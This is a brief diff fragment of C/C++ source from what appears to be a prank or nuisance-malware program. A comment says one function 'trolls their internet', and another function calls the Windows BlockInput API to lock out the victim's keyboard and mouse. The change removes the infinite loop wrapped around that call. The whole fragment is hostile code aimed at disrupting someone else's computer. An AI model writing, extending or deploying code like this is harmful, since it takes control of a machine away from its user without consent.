@@ -24,7 +24,5 @@ void DisInternetTroll(){ //This fucntion just trools their internet, turning it 
 }
 
 void DisInput(){
-        while(1){
         BlockInput(true);
-    }
 }
